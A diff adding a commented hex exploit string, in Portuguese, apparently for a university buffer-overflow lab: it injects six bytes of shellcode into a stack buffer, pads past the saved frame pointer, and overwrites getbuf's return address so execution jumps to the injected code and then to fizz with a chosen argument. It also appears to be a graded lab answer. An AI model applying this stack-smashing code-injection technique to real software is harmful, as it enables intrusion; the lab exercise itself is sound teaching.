@@ -1,0 +1,26 @@
+/* String invasora 3 - Chama fizz() com argumento 0x01020304 */
+/* Estratégia:
+ * 1. Inserir código malicioso no início de buf
+ * 2. Sobrescrever return de getbuf com endereço de buf (executa código injetado)
+ * 3. Código injetado prepara argumento e faz ret para fizz
+ */
+
+/* Código malicioso (6 bytes): movl $0x01020304, %edi; ret */
+/* bf 04 03 02 01 c3 */
+bf 04 03 02 01 c3
+
+/* Padding para completar 40 bytes (buf[32] + saved_rbp[8]) */
+/* Já temos 6 bytes, faltam 34 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00
+
+/* Endereço de buf (0x7fffffffce90) em little-endian */
+/* Este sobrescreve o return de getbuf - força execução do código em buf */
+90 ce ff ff ff 7f 00 00
+
+/* Endereço de fizz (0x0000000000401288) em little-endian */
+/* Este é usado pelo ret do código injetado - chama fizz */
+88 12 40 00 00 00 00 00
